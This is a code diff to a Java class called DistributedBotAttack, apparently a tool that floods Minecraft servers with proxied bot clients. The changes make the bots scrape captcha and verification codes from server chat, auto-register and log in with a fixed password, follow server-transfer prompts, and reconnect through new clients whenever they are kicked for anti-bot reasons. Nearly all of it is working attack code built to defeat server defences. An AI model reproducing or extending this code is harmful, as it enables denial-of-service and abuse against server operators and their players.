@@ -107,26 +107,26 @@ public class DistributedBotAttack extends IAttack {
 			}
 		});
 		regThread = new Thread(() -> {
-			int num = 0;
-			String passwd = Utils.getRandomString(8, 12);
-			while (num < 10) {
-				try {
-					synchronized (clients) {
-						clients.forEach(c -> {
-							if (c.getSession().isConnected()) {
-								if (c.getSession().hasFlag("join")) {
-									c.getSession().send(new ClientChatPacket("/reg " + passwd + " " + passwd));
+			// int num = 0;
+			// String passwd = "123123";
+			// while (num < 10) {
+			// try {
+			// synchronized (clients) {
+			// clients.forEach(c -> {
+			// if (c.getSession().isConnected()) {
+			// if (c.getSession().hasFlag("join")) {
+			// c.getSession().send(new ClientChatPacket("/reg " + passwd + " " + passwd));
 
-								}
-							}
-						});
-					}
-					num++;
-					Thread.sleep(2000);
-				} catch (Exception e1) {
-					// TODO: handle exception
-				}
-			}
+			// }
+			// }
+			// });
+			// }
+			// num++;
+			// Thread.sleep(2000);
+			// } catch (Exception e1) {
+			// // TODO: handle exception
+			// }
+			// }
 
 		});
 
@@ -247,25 +247,46 @@ public class DistributedBotAttack extends IAttack {
 					if (debug) {
 						Utils.log("[" + username + "]" + "[接收聊天]" + "[" + message + "]");
 					}
-					boolean reg = message.contains("以注册") || message.contains("reg");
-					if (reg) {
-						String passwd = Utils.getRandomString(8, 12);
-						client.getSession().send(new ClientChatPacket("/register " + passwd + " " + passwd));
+					if (message.contains("验证码")) {
+						String[] c0des = message.split("你忘了把验证码放在最后: ", 2);
+						String code = c0des[1];
+						String passwd = Utils.getRandomString(6, 12);
+						Utils.log("Code is " + code + "---" + message);
+						client.getSession().send(new ClientChatPacket("/reg " + passwd + " " + passwd + " " + code));
+
 					}
-					if (true) {
-						// try to get authme code
-						boolean iscaptcha = message.contains("人机验证") || message.contains("captcha")
-								|| message.contains("验证码");
-						String[] code2 = message.split("/captcha ", 2);
-						int length = config.toint(config.getValue("authmelength"));
-						if (iscaptcha) {
-							String c0de = code2[1].substring(0, length);
-							if (debug) {
-								Utils.log("Captcha is:" + c0de);
-							}
-							client.getSession().send(new ClientChatPacket("/captcha " + c0de));
-						}
+					if (message.contains("/reg")) {
+						reg(client.getSession());
+
 					}
+					if (message.contains("/login")) {
+						client.getSession().send(new ClientChatPacket("/l 123123"));
+					}
+
+					if (message.contains("tpserver")) {
+						client.getSession().send(new ClientChatPacket("/tpserver " + gethh(message)));
+
+					}
+					// boolean reg = message.contains("以注册") || message.contains("reg");
+					// if (reg) {
+					// String passwd = Utils.getRandomString(8, 12);
+					// client.getSession().send(new ClientChatPacket("/register " + passwd + " " +
+					// passwd));
+					// }
+					// if (true) {
+					// // try to get authme code
+					// boolean iscaptcha = message.contains("人机验证") || message.contains("captcha")
+					// || message.contains("验证码");
+					// String[] code2 = message.split("/captcha ", 2);
+					// int length = config.toint(config.getValue("authmelength"));
+					// if (iscaptcha) {
+					// String c0de = code2[1].substring(0, length);
+					// if (debug) {
+					// Utils.log("Captcha is:" + c0de);
+					// }
+					// client.getSession().send(new ClientChatPacket("/captcha " + c0de));
+					// }
+					// }
 				}
 
 				if (e.getPacket() instanceof ServerJoinGamePacket) {
@@ -302,10 +323,14 @@ public class DistributedBotAttack extends IAttack {
 				Utils.log("Client", "[断开][" + username + "] " + msg);
 				String reason = e.getReason();
 				boolean stats = reason.contains("重") || reason.contains("join") || reason.contains("antibot")
-						|| reason.contains("加入");
+						|| reason.contains("加入") || reason.contains("反") || reason.contains("等");
 				if (stats) {
 					Utils.log("[" + username + "]正在重连......");
-					client.getSession().connect(true);
+					Client client1 = createClient(ip, port, username, proxy);
+					client1.getSession().setReadTimeout(10 * 1000);
+					client1.getSession().setWriteTimeout(10 * 1000);
+					clients.add(client1);
+					client1.getSession().connect(false);
 
 				}
 			}
@@ -344,9 +369,10 @@ public class DistributedBotAttack extends IAttack {
 
 	public void sendTab(Session session, String text) {
 		try {
-			session.send((Packet) new ClientSwingArmPacket());
-			session.send((Packet) new ClientChangeHeldItemPacket(1 + new Random().nextInt(8)));
-			session.send((new ClientKeepAlivePacket(1)));
+			// session.send((Packet) new ClientSwingArmPacket());
+			// session.send((Packet) new ClientChangeHeldItemPacket(1 + new
+			// Random().nextInt(8)));
+			// session.send((new ClientKeepAlivePacket(1)));
 		} catch (Exception e) {
 		}
 	}
@@ -360,7 +386,7 @@ public class DistributedBotAttack extends IAttack {
 
 	public void reg(Session session) {
 		try {
-			String passwd = Utils.getRandomString(8, 12);
+			String passwd = "123123";
 			session.send(
 					new ClientChatPacket("/reg " + passwd + " " + passwd));
 			// String email;
@@ -374,6 +400,13 @@ public class DistributedBotAttack extends IAttack {
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
+
+	}
+
+	public static String gethh(String msgString) {
+		String[] token = msgString.split("/tpserver ", 2);
+		String[] token1 = token[1].split("\"}", 2);
+		return token1[0];
 
 	}
 }
